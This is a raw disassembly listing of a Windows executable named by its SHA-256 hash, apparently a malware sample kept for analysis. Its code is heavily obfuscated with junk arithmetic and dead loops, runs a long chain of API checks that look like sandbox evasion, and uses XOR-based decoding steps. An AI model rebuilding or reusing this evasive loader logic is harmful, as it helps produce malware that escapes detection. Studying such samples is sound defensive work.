
5498518c6646fe1f040d53153584b576d6b7ccc40c7497849a276bf9ee745762.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	or     DWORD PTR ds:0x42c010,0x42b004
  401013:	push   edi
  401014:	adc    DWORD PTR ds:0x42c000,0x42b014
  40101e:	push   0x42e423
  401023:	dec    DWORD PTR ds:0x42a018
  401029:	xor    edi,edi
  40102b:	not    DWORD PTR ds:0x42901c
  401031:	inc    edi
  401032:	push   edi
  401033:	push   edi
  401034:	call   DWORD PTR ds:0x42e9c3
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42b01c,0x7587
  401046:	je     0x401075
  40104c:	lea    eax,[ebp-0x64]
  40104f:	not    DWORD PTR ds:0x42b004
  401055:	push   eax
  401056:	adc    DWORD PTR ds:0x42d00c,0x42d014
  401060:	call   DWORD PTR ds:0x42e98b
  401066:	mov    DWORD PTR ds:0x42a00c,0x7907
  401070:	jmp    0x4026aa
  401075:	sub    DWORD PTR ds:0x42a010,0x42a01c
  40107f:	push   esi
  401080:	mov    esi,DWORD PTR ds:0x42e9cf
  401086:	push   0x8
  401088:	sub    DWORD PTR ds:0x429004,0x42c000
  401092:	push   0x42e433
  401097:	sub    DWORD PTR ds:0x429000,0x1be5
  4010a1:	call   esi
  4010a3:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010ad:	test   eax,eax
  4010af:	mov    DWORD PTR ds:0x42b000,0x51df
  4010b9:	je     0x4010de
  4010bf:	lea    eax,[ebp-0x64]
  4010c2:	and    DWORD PTR ds:0x42d014,0x42a004
  4010cc:	push   eax
  4010cd:	inc    DWORD PTR ds:0x42d008
  4010d3:	call   DWORD PTR ds:0x42e98b
  4010d9:	jmp    0x4026a9
  4010de:	xor    DWORD PTR ds:0x42a008,0x429000
  4010e8:	push   ebx
  4010e9:	mov    ebx,DWORD PTR ds:0x42e99b
  4010ef:	add    DWORD PTR ds:0x429004,0x5c52
  4010f9:	push   0x42e443
  4010fe:	adc    DWORD PTR ds:0x42c014,0x42b014
  401108:	push   edi
  401109:	push   edi
  40110a:	and    DWORD PTR ds:0x429020,0x61d3
  401114:	call   ebx
  401116:	test   eax,eax
  401118:	mov    DWORD PTR ds:0x42b018,0x2d2c
  401122:	je     0x40115f
  401128:	sbb    DWORD PTR ds:0x42a010,0x429004
  401132:	lea    eax,[ebp-0x64]
  401135:	xor    DWORD PTR ds:0x42c000,0x429008
  40113f:	push   eax
  401140:	or     DWORD PTR ds:0x429000,0x4b22
  40114a:	call   DWORD PTR ds:0x42e98b
  401150:	mov    DWORD PTR ds:0x429004,0x6e7d
  40115a:	jmp    0x4026a8
  40115f:	push   0xc
  401161:	sbb    DWORD PTR ds:0x42d014,0x5298
  40116b:	push   0x42e467
  401170:	sbb    DWORD PTR ds:0x42c010,0x42c008
  40117a:	call   esi
  40117c:	dec    DWORD PTR ds:0x42d000
  401182:	test   eax,eax
  401184:	jne    0x401768
  40118a:	push   0x7
  40118c:	push   0x42e47b
  401191:	call   esi
  401193:	adc    DWORD PTR ds:0x429014,0x42900c
  40119d:	test   eax,eax
  40119f:	mov    DWORD PTR ds:0x42c000,0x2037
  4011a9:	jne    0x401768
  4011af:	push   0x8
  4011b1:	xor    DWORD PTR ds:0x42d010,0x429014
  4011bb:	push   0x42e48b
  4011c0:	and    DWORD PTR ds:0x42d010,0x7e73
  4011ca:	call   esi
  4011cc:	test   eax,eax
  4011ce:	mov    DWORD PTR ds:0x429014,0x43a5
  4011d8:	jne    0x401768
  4011de:	push   0x42e49b
  4011e3:	adc    DWORD PTR ds:0x429014,0x42b00c
  4011ed:	push   edi
  4011ee:	push   edi
  4011ef:	call   DWORD PTR ds:0x42e9c3
  4011f5:	xor    DWORD PTR ds:0x429008,0xc25
  4011ff:	test   eax,eax
  401201:	mov    DWORD PTR ds:0x42b004,0x1e9f
  40120b:	jne    0x401768
  401211:	sbb    DWORD PTR ds:0x42b008,0x42a01c
  40121b:	push   0x42e4ab
  401220:	push   edi
  401221:	sbb    DWORD PTR ds:0x42b000,0x42b018
  40122b:	push   edi
  40122c:	sbb    DWORD PTR ds:0x42a008,0x42c00c
  401236:	call   ebx
  401238:	adc    DWORD PTR ds:0x42a01c,0xefe
  401242:	test   eax,eax
  401244:	mov    DWORD PTR ds:0x42d014,0x5190
  40124e:	jne    0x401768
  401254:	sub    DWORD PTR ds:0x42b000,0x721d
  40125e:	push   0xc
  401260:	add    DWORD PTR ds:0x42d018,0x42c000
  40126a:	push   0x42e4cf
  40126f:	call   esi
  401271:	test   eax,eax
  401273:	mov    DWORD PTR ds:0x42a014,0x465b
  40127d:	jne    0x401768
  401283:	or     DWORD PTR ds:0x42d014,0x42900c
  40128d:	push   0x7
  40128f:	push   0x42e4e3
  401294:	xor    DWORD PTR ds:0x42c014,0x14b0
  40129e:	call   esi
  4012a0:	test   eax,eax
  4012a2:	mov    DWORD PTR ds:0x42a01c,0x4b6
  4012ac:	jne    0x401768
  4012b2:	push   0x8
  4012b4:	or     DWORD PTR ds:0x429028,0x429010
  4012be:	push   0x42e4f3
  4012c3:	sbb    DWORD PTR ds:0x42a010,0x429008
  4012cd:	call   esi
  4012cf:	test   eax,eax
  4012d1:	mov    DWORD PTR ds:0x42a00c,0x7915
  4012db:	jne    0x401768
  4012e1:	or     DWORD PTR ds:0x42b000,0xa15
  4012eb:	push   0x42e503
  4012f0:	push   edi
  4012f1:	sub    DWORD PTR ds:0x42901c,0x42c008
  4012fb:	push   edi
  4012fc:	xor    DWORD PTR ds:0x42a01c,0x42d010
  401306:	call   DWORD PTR ds:0x42e9c3
  40130c:	test   eax,eax
  40130e:	jne    0x401768
  401314:	sub    DWORD PTR ds:0x42d014,0x42a000
  40131e:	push   0x42e513
  401323:	adc    DWORD PTR ds:0x42b018,0x14c4
  40132d:	push   edi
  40132e:	xor    DWORD PTR ds:0x42c008,0x6706
  401338:	push   edi
  401339:	or     DWORD PTR ds:0x42a01c,0x6055
  401343:	call   ebx
  401345:	sub    DWORD PTR ds:0x429014,0x42b00c
  40134f:	test   eax,eax
  401351:	mov    DWORD PTR ds:0x42d00c,0x550a
  40135b:	jne    0x401768
  401361:	push   0xc
  401363:	push   0x42e537
  401368:	adc    DWORD PTR ds:0x42c00c,0x429018
  401372:	call   esi
  401374:	test   eax,eax
  401376:	mov    DWORD PTR ds:0x429024,0x758e
  401380:	jne    0x401768
  401386:	push   0x7
  401388:	adc    DWORD PTR ds:0x429010,0x1615
  401392:	push   0x42e54b
  401397:	sub    DWORD PTR ds:0x429008,0x42b01c
  4013a1:	call   esi
  4013a3:	adc    DWORD PTR ds:0x42c01c,0x7f54
  4013ad:	test   eax,eax
  4013af:	jne    0x401768
  4013b5:	or     DWORD PTR ds:0x429000,0x429008
  4013bf:	push   0x8
  4013c1:	sub    DWORD PTR ds:0x42a000,0x50c8
  4013cb:	push   0x42e55b
  4013d0:	call   esi
  4013d2:	xor    DWORD PTR ds:0x42a018,0x58f3
  4013dc:	test   eax,eax
  4013de:	mov    DWORD PTR ds:0x42a010,0x4d09
  4013e8:	jne    0x401768
  4013ee:	push   0x42e56b
  4013f3:	push   edi
  4013f4:	sbb    DWORD PTR ds:0x42c00c,0x429018
  4013fe:	push   edi
  4013ff:	call   DWORD PTR ds:0x42e9c3
  401405:	sbb    DWORD PTR ds:0x42d008,0x42d004
  40140f:	test   eax,eax
  401411:	mov    DWORD PTR ds:0x42a010,0xbaa
  40141b:	jne    0x401768
  401421:	push   0x42e57b
  401426:	push   edi
  401427:	push   edi
  401428:	call   ebx
  40142a:	sbb    DWORD PTR ds:0x42b000,0x429014
  401434:	test   eax,eax
  401436:	mov    DWORD PTR ds:0x42d008,0x1c53
  401440:	jne    0x401768
  401446:	adc    DWORD PTR ds:0x42a00c,0x429024
  401450:	push   0xc
  401452:	push   0x42e59f
  401457:	sbb    DWORD PTR ds:0x429028,0x2f15
  401461:	call   esi
  401463:	test   eax,eax
  401465:	mov    DWORD PTR ds:0x42d004,0x2bd4
  40146f:	jne    0x401768
  401475:	mov    DWORD PTR ds:0x42d014,0xc7e
  40147f:	push   0x7
  401481:	or     DWORD PTR ds:0x42b01c,0x629c
  40148b:	push   0x42e5b3
  401490:	call   esi
  401492:	xor    DWORD PTR ds:0x429020,0x42c014
  40149c:	test   eax,eax
  40149e:	mov    DWORD PTR ds:0x42b008,0x386
  4014a8:	jne    0x401768
  4014ae:	push   0x8
  4014b0:	push   0x42e5c3
  4014b5:	sub    DWORD PTR ds:0x429024,0x42a008
  4014bf:	call   esi
  4014c1:	sub    DWORD PTR ds:0x42b004,0x42c018
  4014cb:	test   eax,eax
  4014cd:	mov    DWORD PTR ds:0x42900c,0x6fc8
  4014d7:	jne    0x401768
  4014dd:	xor    DWORD PTR ds:0x42d010,0x42901c
  4014e7:	push   0x42e5d3
  4014ec:	and    DWORD PTR ds:0x42d014,0x50c
  4014f6:	push   edi
  4014f7:	push   edi
  4014f8:	sbb    DWORD PTR ds:0x42b000,0x3361
  401502:	call   DWORD PTR ds:0x42e9c3
  401508:	test   eax,eax
  40150a:	mov    DWORD PTR ds:0x42b008,0x5d56
  401514:	jne    0x401768
  40151a:	xor    DWORD PTR ds:0x42a000,0x4d69
  401524:	push   0x42e5e3
  401529:	and    DWORD PTR ds:0x429024,0x42a014
  401533:	push   edi
  401534:	or     DWORD PTR ds:0x42c004,0x3817
  40153e:	push   edi
  40153f:	add    DWORD PTR ds:0x429024,0x2571
  401549:	call   ebx
  40154b:	xor    DWORD PTR ds:0x429028,0x42b00c
  401555:	test   eax,eax
  401557:	mov    DWORD PTR ds:0x42b00c,0x17fe
  401561:	jne    0x401768
  401567:	mov    DWORD PTR ds:0x42c014,0x28c7
  401571:	push   0xc
  401573:	and    DWORD PTR ds:0x429024,0x5a57
  40157d:	push   0x42e607
  401582:	call   esi
  401584:	test   eax,eax
  401586:	mov    DWORD PTR ds:0x42b00c,0xc7e
  401590:	jne    0x401768
  401596:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015a0:	push   0x7
  4015a2:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015ac:	push   0x42e61b
  4015b1:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015bb:	call   esi
  4015bd:	xor    DWORD PTR ds:0x42c00c,0x55d5
  4015c7:	test   eax,eax
  4015c9:	jne    0x401768
  4015cf:	or     DWORD PTR ds:0x429008,0x62a0
  4015d9:	push   0x8
  4015db:	or     DWORD PTR ds:0x429020,0x42d018
  4015e5:	push   0x42e62b
  4015ea:	call   esi
  4015ec:	test   eax,eax
  4015ee:	mov    DWORD PTR ds:0x429010,0x43d8
  4015f8:	jne    0x401768
  4015fe:	push   0x42e63b
  401603:	sub    DWORD PTR ds:0x42a008,0x5452
  40160d:	push   edi
  40160e:	adc    DWORD PTR ds:0x42b004,0x3794
  401618:	push   edi
  401619:	add    DWORD PTR ds:0x42b018,0x429000
  401623:	call   DWORD PTR ds:0x42e9c3
  401629:	add    DWORD PTR ds:0x42b014,0x42c014
  401633:	test   eax,eax
  401635:	mov    DWORD PTR ds:0x42c010,0x9db
  40163f:	jne    0x401768
  401645:	add    DWORD PTR ds:0x42b01c,0x42c010
  40164f:	push   0x42e64b
  401654:	push   edi
  401655:	push   edi
  401656:	call   ebx
  401658:	test   eax,eax
  40165a:	jne    0x401768
  401660:	sub    DWORD PTR ds:0x42a010,0x42b00c
  40166a:	push   0xc
  40166c:	xor    DWORD PTR ds:0x42a000,0x46f8
  401676:	push   0x42e66f
  40167b:	sub    DWORD PTR ds:0x429028,0x1e37
  401685:	call   esi
  401687:	not    DWORD PTR ds:0x42b000
  40168d:	test   eax,eax
  40168f:	mov    DWORD PTR ds:0x42a010,0x1824
  401699:	jne    0x401768
  40169f:	push   0x7
  4016a1:	neg    DWORD PTR ds:0x42d004
  4016a7:	push   0x42e683
  4016ac:	call   esi
  4016ae:	xor    DWORD PTR ds:0x429020,0x5303
  4016b8:	test   eax,eax
  4016ba:	jne    0x401768
  4016c0:	sub    DWORD PTR ds:0x429014,0x42c01c
  4016ca:	push   0x8
  4016cc:	not    DWORD PTR ds:0x429000
  4016d2:	push   0x42e693
  4016d7:	or     DWORD PTR ds:0x42c01c,0x7461
  4016e1:	call   esi
  4016e3:	test   eax,eax
  4016e5:	jne    0x401768
  4016eb:	or     DWORD PTR ds:0x42b010,0x6614
  4016f5:	push   0x42e6a3
  4016fa:	push   edi
  4016fb:	and    DWORD PTR ds:0x42b01c,0x42a008
  401705:	push   edi
  401706:	call   DWORD PTR ds:0x42e9c3
  40170c:	sub    DWORD PTR ds:0x429010,0x42a018
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42b004,0x423f
  401722:	jne    0x401768
  401728:	push   0x42e6b3
  40172d:	and    DWORD PTR ds:0x42d014,0x5d3e
  401737:	push   edi
  401738:	push   edi
  401739:	call   ebx
  40173b:	sub    DWORD PTR ds:0x42a004,0x8003
  401745:	test   eax,eax
  401747:	jne    0x401768
  40174d:	push   0xc
  40174f:	push   0x42e6d7
  401754:	call   esi
  401756:	or     DWORD PTR ds:0x42a014,0x792e
  401760:	test   eax,eax
  401762:	je     0x401783
  401768:	add    DWORD PTR ds:0x42d004,0x429000
  401772:	xor    eax,eax
  401774:	mov    DWORD PTR ds:0x42c00c,0x1740
  40177e:	jmp    0x4026a8
  401783:	sub    DWORD PTR ds:0x42c01c,0x74ec
  40178d:	mov    DWORD PTR [ebp-0x10],0x0
  401794:	sub    edx,ecx
  401796:	mov    eax,DWORD PTR [ebp-0x34]
  401799:	adc    edx,DWORD PTR ds:0x42b004
  40179f:	mov    DWORD PTR [ebp-0x34],eax
  4017a2:	sub    edx,DWORD PTR ds:0x429024
  4017a8:	mov    ecx,0xf89c85b9
  4017ad:	xor    esi,esi
  4017af:	or     esi,DWORD PTR ds:0x42b018
  4017b5:	adc    DWORD PTR ds:0x429020,esi
  4017bb:	mov    DWORD PTR [ebp-0x8],ecx
  4017be:	mov    edx,DWORD PTR ds:0x42d004
  4017c4:	sbb    edx,DWORD PTR ds:0x42901c
  4017ca:	mov    DWORD PTR ds:0x42d004,edx
  4017d0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4017d7:	add    esi,edx
  4017d9:	lea    eax,[ebp-0x3c]
  4017dc:	xor    edx,edx
  4017de:	mov    DWORD PTR [ebp-0x30],eax
  4017e1:	lea    eax,[ebp-0x44]
  4017e4:	mov    DWORD PTR ds:0x42b00c,0x18
  4017ee:	cmp    DWORD PTR ds:0x42b00c,0x0
  4017f5:	je     0x40184f
  4017fb:	cmp    DWORD PTR ds:0x42b00c,0x7
  401802:	jne    0x40181d
  401808:	push   0x42b010
  40180d:	push   0x42c014
  401812:	push   0x42d004
  401817:	call   DWORD PTR ds:0x42e993
  40181d:	cmp    DWORD PTR ds:0x42b00c,0x8
  401824:	jne    0x401837
  40182a:	mov    esi,DWORD PTR ds:0x42b00c
  401830:	dec    esi
  401831:	mov    DWORD PTR ds:0x42b00c,esi
  401837:	mov    esi,DWORD PTR ds:0x42b00c
  40183d:	dec    esi
  40183e:	mov    DWORD PTR ds:0x42b00c,esi
  401844:	jmp    0x4017ee
  401849:	adc    DWORD PTR ds:0x429000,ebx
  40184f:	mov    DWORD PTR [ebp-0x18],eax
  401852:	mov    eax,ds:0x42e313
  401857:	and    DWORD PTR ds:0x429004,0x0
  401861:	jmp    0x401873
  401866:	mov    edi,DWORD PTR ds:0x429004
  40186c:	inc    edi
  40186d:	mov    DWORD PTR ds:0x429004,edi
  401873:	cmp    DWORD PTR ds:0x429004,0x1c
  40187a:	jae    0x4018a6
  401880:	cmp    DWORD PTR ds:0x429004,0x22
  401887:	jne    0x40189b
  40188d:	push   0x0
  40188f:	push   DWORD PTR [ebp-0x20]
  401892:	push   DWORD PTR [ebp-0x10]
  401895:	call   DWORD PTR ds:0x42e997
  40189b:	jmp    0x401866
  4018a0:	adc    DWORD PTR ds:0x42c018,ebx
  4018a6:	mov    eax,DWORD PTR [eax+0x1c8]
  4018ac:	mov    DWORD PTR ds:0x42a010,0x15
  4018b6:	cmp    DWORD PTR ds:0x42a010,0x0
  4018bd:	je     0x401923
  4018c3:	cmp    DWORD PTR ds:0x42a010,0xa
  4018ca:	jne    0x4018f1
  4018d0:	push   DWORD PTR [ebp-0x10]
  4018d3:	push   0x85d6
  4018d8:	push   0x42c01c
  4018dd:	push   DWORD PTR [ebp-0x24]
  4018e0:	push   DWORD PTR [ebp-0x18]
  4018e3:	push   0x61a0
  4018e8:	push   DWORD PTR [ebp-0x18]
  4018eb:	call   DWORD PTR ds:0x42e99f
  4018f1:	cmp    DWORD PTR ds:0x42a010,0xb
  4018f8:	jne    0x40190b
  4018fe:	mov    esi,DWORD PTR ds:0x42a010
  401904:	dec    esi
  401905:	mov    DWORD PTR ds:0x42a010,esi
  40190b:	mov    esi,DWORD PTR ds:0x42a010
  401911:	dec    esi
  401912:	mov    DWORD PTR ds:0x42a010,esi
  401918:	jmp    0x4018b6
  40191d:	and    DWORD PTR ds:0x42b000,edx
  401923:	mov    eax,DWORD PTR [eax]
  401925:	xor    DWORD PTR ds:0x42c01c,0x42d014
  40192f:	mov    edx,DWORD PTR [ebp-0x18]
  401932:	or     esi,DWORD PTR ds:0x42d014
  401938:	mov    esi,0x7510899
  40193d:	xor    eax,esi
  40193f:	mov    edi,0x3272e0
  401944:	add    eax,edi
  401946:	mov    DWORD PTR [edx],eax
  401948:	mov    DWORD PTR ds:0x42900c,0x4148
  401952:	mov    eax,ds:0x42e7c3
  401957:	cmp    eax,0x312bc9f6
  40195c:	mov    DWORD PTR ds:0x429010,0x7018
  401966:	jne    0x401abf
  40196c:	adc    DWORD PTR ds:0x42a018,0x1f6
  401976:	mov    eax,DWORD PTR [ebp-0x8]
  401979:	and    DWORD PTR ds:0x42d010,0x0
  401983:	jmp    0x401995
  401988:	mov    ebx,DWORD PTR ds:0x42d010
  40198e:	inc    ebx
  40198f:	mov    DWORD PTR ds:0x42d010,ebx
  401995:	cmp    DWORD PTR ds:0x42d010,0x1a
  40199c:	jae    0x4019d3
  4019a2:	cmp    DWORD PTR ds:0x42d010,0x1f
  4019a9:	jne    0x4019c8
  4019af:	push   0x42b018
  4019b4:	push   DWORD PTR [ebp-0x18]
  4019b7:	push   0x42e127
  4019bc:	push   DWORD PTR [ebp-0x24]
  4019bf:	push   DWORD PTR [ebp-0x14]
  4019c2:	call   DWORD PTR ds:0x42e9a3
  4019c8:	jmp    0x401988
  4019cd:	and    ebx,DWORD PTR ds:0x429020
  4019d3:	mov    edx,DWORD PTR ds:0x42e313
  4019d9:	sbb    DWORD PTR ds:0x42b000,edi
  4019df:	mov    edx,DWORD PTR [edx+0x198]
  4019e5:	inc    ebx
  4019e6:	xor    eax,esi
  4019e8:	movzx  ebx,WORD PTR ds:0x42b01c
  4019ef:	or     DWORD PTR ds:0x429014,ebx
  4019f5:	add    eax,edi
  4019f7:	sub    DWORD PTR ds:0x42b008,edx
  4019fd:	mov    DWORD PTR [edx],eax
  4019ff:	add    ebx,0x6ca
  401a05:	mov    eax,DWORD PTR [ebp-0x8]
  401a08:	mov    DWORD PTR ds:0x429008,0x1c
  401a12:	cmp    DWORD PTR ds:0x429008,0x0
  401a19:	je     0x401a65
  401a1f:	cmp    DWORD PTR ds:0x429008,0x9
  401a26:	jne    0x401a37
  401a2c:	push   0x42d004
  401a31:	call   DWORD PTR ds:0x42e9ab
  401a37:	cmp    DWORD PTR ds:0x429008,0xa
  401a3e:	jne    0x401a51
  401a44:	mov    ebx,DWORD PTR ds:0x429008
  401a4a:	dec    ebx
  401a4b:	mov    DWORD PTR ds:0x429008,ebx
  401a51:	xor    ebx,ebx
  401a53:	add    ebx,DWORD PTR ds:0x429008
  401a59:	dec    ebx
  401a5a:	mov    DWORD PTR ds:0x429008,ebx
  401a60:	jmp    0x401a12
  401a65:	xor    eax,esi
  401a67:	mov    DWORD PTR ds:0x42a010,0x13
  401a71:	cmp    DWORD PTR ds:0x42a010,0x0
  401a78:	je     0x401ab2
  401a7e:	cmp    DWORD PTR ds:0x42a010,0x23
  401a85:	jne    0x401a9e
  401a8b:	push   DWORD PTR [ebp-0xc]
  401a8e:	push   0x0
  401a90:	push   0x429028
  401a95:	push   DWORD PTR [ebp-0x1c]
  401a98:	call   DWORD PTR ds:0x42e9af
  401a9e:	mov    ebx,DWORD PTR ds:0x42a010
  401aa4:	dec    ebx
  401aa5:	mov    DWORD PTR ds:0x42a010,ebx
  401aab:	jmp    0x401a71
  401ab0:	not    ebx
  401ab2:	add    eax,edi
  401ab4:	xor    DWORD PTR ds:0x42900c,ecx
  401aba:	mov    ds:0x42e7c3,eax
  401abf:	xor    DWORD PTR ds:0x42c010,0x7580
  401ac9:	mov    eax,ds:0x42e313
  401ace:	and    DWORD PTR ds:0x42d018,0x0
  401ad8:	mov    ebx,DWORD PTR ds:0x42d018
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x42d018,ebx
  401ae5:	cmp    DWORD PTR ds:0x42d018,0x4
  401aec:	jne    0x401af8
  401af2:	call   DWORD PTR ds:0x42e9b3
  401af8:	cmp    DWORD PTR ds:0x42d018,0x3
  401aff:	jne    0x401b12
  401b05:	mov    ebx,DWORD PTR ds:0x42d018
  401b0b:	inc    ebx
  401b0c:	mov    DWORD PTR ds:0x42d018,ebx
  401b12:	cmp    DWORD PTR ds:0x42d018,0x1f
  401b19:	jb     0x401ad8
  401b1f:	add    DWORD PTR ds:0x42a000,0x4980
  401b29:	mov    eax,DWORD PTR [eax+0x18c]
  401b2f:	mov    eax,DWORD PTR [eax]
  401b31:	mov    DWORD PTR [ebp-0x7c],eax
  401b34:	or     DWORD PTR ds:0x42c014,ebx
  401b3a:	mov    ebx,0xf89c85bd
  401b3f:	mov    DWORD PTR [ebp-0x10],ebx
  401b42:	mov    DWORD PTR [ebp-0x10],ebx
  401b45:	add    eax,0x7960
  401b4a:	mov    DWORD PTR [ebp-0x10],ebx
  401b4d:	or     eax,DWORD PTR ds:0x42c000
  401b53:	mov    DWORD PTR [ebp-0x18],ecx
  401b56:	mov    DWORD PTR ds:0x429000,0x1d
  401b60:	cmp    DWORD PTR ds:0x429000,0x0
  401b67:	je     0x401c18
  401b6d:	cmp    DWORD PTR ds:0x429000,0xf
  401b74:	jne    0x401b9a
  401b7a:	push   DWORD PTR [ebp-0x18]
  401b7d:	push   0x429020
  401b82:	push   0x22ca
  401b87:	push   0x6383
  401b8c:	push   DWORD PTR [ebp-0x18]
  401b8f:	push   0x7f4f
  401b94:	call   DWORD PTR ds:0x42e9b7
  401b9a:	cmp    DWORD PTR ds:0x429000,0x10
  401ba1:	jne    0x401bb2
  401ba7:	mov    eax,ds:0x429000
  401bac:	dec    eax
  401bad:	mov    ds:0x429000,eax
  401bb2:	mov    eax,ds:0x429000
  401bb7:	dec    eax
  401bb8:	mov    ds:0x429000,eax
  401bbd:	jmp    0x401b60
  401bc2:	and    DWORD PTR ds:0x42a000,0x0
  401bcc:	xor    eax,eax
  401bce:	add    eax,DWORD PTR ds:0x42a000
  401bd4:	inc    eax
  401bd5:	mov    ds:0x42a000,eax
  401bda:	cmp    DWORD PTR ds:0x42a000,0xd
  401be1:	jne    0x401bed
  401be7:	call   DWORD PTR ds:0x42e9bb
  401bed:	cmp    DWORD PTR ds:0x42a000,0xc
  401bf4:	jne    0x401c05
  401bfa:	mov    eax,ds:0x42a000
  401bff:	inc    eax
  401c00:	mov    ds:0x42a000,eax
  401c05:	cmp    DWORD PTR ds:0x42a000,0x18
  401c0c:	jb     0x401bcc
  401c12:	or     DWORD PTR ds:0x42c008,ebx
  401c18:	mov    DWORD PTR [ebp-0x10],ebx
  401c1b:	xor    DWORD PTR ds:0x42c000,edx
  401c21:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  401c28:	mov    eax,DWORD PTR [ebp-0x8]
  401c2b:	xor    eax,esi
  401c2d:	or     DWORD PTR ds:0x42d000,0x4414
  401c37:	add    eax,edi
  401c39:	mov    DWORD PTR ds:0x429018,0x61ad
  401c43:	jmp    0x401d03
  401c48:	and    DWORD PTR ds:0x42b018,0x0
  401c52:	xor    ecx,ecx
  401c54:	add    ecx,DWORD PTR ds:0x42b018
  401c5a:	inc    ecx
  401c5b:	mov    DWORD PTR ds:0x42b018,ecx
  401c61:	cmp    DWORD PTR ds:0x42b018,0x29
  401c68:	jne    0x401c81
  401c6e:	push   DWORD PTR [ebp-0x24]
  401c71:	push   0x42c018
  401c76:	push   0x8c2e
  401c7b:	call   DWORD PTR ds:0x42e9bf
  401c81:	cmp    DWORD PTR ds:0x42b018,0x19
  401c88:	jb     0x401c52
  401c8e:	mov    eax,DWORD PTR [ebp-0xc]
  401c91:	adc    ecx,DWORD PTR ds:0x42b000
  401c97:	mov    ecx,DWORD PTR [ebp-0x1c]
  401c9a:	xor    eax,esi
  401c9c:	lea    eax,[eax+ecx*1+0x3272e0]
  401ca3:	push   eax
  401ca4:	mov    eax,DWORD PTR [ebp-0x18]
  401ca7:	or     DWORD PTR ds:0x42c01c,0x6aa9
  401cb1:	xor    eax,esi
  401cb3:	add    DWORD PTR ds:0x42d014,0x21f
  401cbd:	lea    eax,[ebp+eax*1+0x3272e8]
  401cc4:	or     DWORD PTR ds:0x42d004,0x505e
  401cce:	push   eax
  401ccf:	adc    DWORD PTR ds:0x42c01c,ecx
  401cd5:	mov    eax,ds:0x42e313
  401cda:	push   DWORD PTR [eax+0x1bc]
  401ce0:	sbb    DWORD PTR ds:0x42d004,0x7640
  401cea:	call   0x4026bd
  401cef:	xor    eax,0x743a
  401cf4:	mov    eax,DWORD PTR [ebp-0xc]
  401cf7:	mov    ecx,DWORD PTR [ebp-0x1c]
  401cfa:	xor    eax,esi
  401cfc:	lea    eax,[ecx+eax*1+0x3272e0]
  401d03:	mov    ecx,DWORD PTR [ebp-0xc]
  401d06:	not    edx
  401d08:	mov    edx,DWORD PTR [ebp-0xc]
  401d0b:	sbb    DWORD PTR ds:0x42c008,0x6696
  401d15:	xor    edx,esi
  401d17:	xor    ecx,esi
  401d19:	sub    DWORD PTR ds:0x42c014,0x5039
  401d23:	add    ecx,edx
  401d25:	mov    edx,DWORD PTR [ebp-0xc]
  401d28:	xor    edx,esi
  401d2a:	mov    DWORD PTR ds:0x42d004,0x46d7
  401d34:	lea    ecx,[ecx+edx*1+0x9758a0]
  401d3b:	mov    DWORD PTR [ebp-0x1c],eax
  401d3e:	cmp    eax,ecx
  401d40:	mov    DWORD PTR ds:0x42c01c,0x3624
  401d4a:	jbe    0x401c48
  401d50:	mov    DWORD PTR ds:0x42a018,0x1f
  401d5a:	cmp    DWORD PTR ds:0x42a018,0x0
  401d61:	je     0x401db7
  401d67:	cmp    DWORD PTR ds:0x42a018,0xc
  401d6e:	jne    0x401d89
  401d74:	push   0x42e127
  401d79:	push   0x42e139
  401d7e:	push   0x400000
  401d83:	call   DWORD PTR ds:0x42e9c7
  401d89:	cmp    DWORD PTR ds:0x42a018,0xd
  401d90:	jne    0x401da1
  401d96:	mov    eax,ds:0x42a018
  401d9b:	dec    eax
  401d9c:	mov    ds:0x42a018,eax
  401da1:	mov    eax,ds:0x42a018
  401da6:	dec    eax
  401da7:	mov    ds:0x42a018,eax
  401dac:	jmp    0x401d5a
  401db1:	sbb    ecx,0x5e3
  401db7:	mov    eax,DWORD PTR [ebp+0xc]
  401dba:	dec    ecx
  401dbb:	mov    ds:0x42e197,eax
  401dc0:	mov    DWORD PTR ds:0x42c010,0x5070
  401dca:	mov    eax,DWORD PTR [ebp+0x10]
  401dcd:	and    DWORD PTR ds:0x42b000,0x0
  401dd7:	mov    ecx,DWORD PTR ds:0x42b000
  401ddd:	inc    ecx
  401dde:	mov    DWORD PTR ds:0x42b000,ecx
  401de4:	cmp    DWORD PTR ds:0x42b000,0x22
  401deb:	jne    0x401dfc
  401df1:	push   0x42e000
  401df6:	call   DWORD PTR ds:0x42e9cb
  401dfc:	cmp    DWORD PTR ds:0x42b000,0x18
  401e03:	jb     0x401dd7
  401e09:	mov    ds:0x42e3eb,eax
  401e0e:	mov    eax,ds:0x42e197
  401e13:	add    DWORD PTR ds:0x42a010,ebx
  401e19:	mov    ecx,DWORD PTR [ebp-0x30]
  401e1c:	and    DWORD PTR ds:0x42900c,0x4f3f
  401e26:	sub    eax,edi
  401e28:	xor    DWORD PTR ds:0x42a018,0x42a01c
  401e32:	xor    eax,esi
  401e34:	mov    DWORD PTR [ecx],eax
  401e36:	movzx  eax,BYTE PTR ds:0x42900c
  401e3d:	mov    eax,DWORD PTR [ebp-0x34]
  401e40:	cmp    eax,0xf89c85b9
  401e45:	mov    DWORD PTR ds:0x42901c,0x22d7
  401e4f:	jne    0x402106
  401e55:	lea    eax,[ebp-0x40]
  401e58:	mov    DWORD PTR [ebp-0x9c],eax
  401e5e:	or     DWORD PTR ds:0x429028,0x42a008
  401e68:	lea    eax,[ebp+0x4]
  401e6b:	add    DWORD PTR ds:0x42a014,0x42c008
  401e75:	mov    DWORD PTR [ebp-0x40],eax
  401e78:	mov    eax,DWORD PTR [ebp-0x40]
  401e7b:	test   eax,eax
  401e7d:	mov    DWORD PTR ds:0x42b000,0x1a3e
  401e87:	je     0x40268d
  401e8d:	xor    ecx,0x3b66
  401e93:	mov    eax,DWORD PTR [ebp-0x24]
  401e96:	and    DWORD PTR ds:0x429028,0x0
  401ea0:	jmp    0x401eb2
  401ea5:	mov    ecx,DWORD PTR ds:0x429028
  401eab:	inc    ecx
  401eac:	mov    DWORD PTR ds:0x429028,ecx
  401eb2:	cmp    DWORD PTR ds:0x429028,0x14
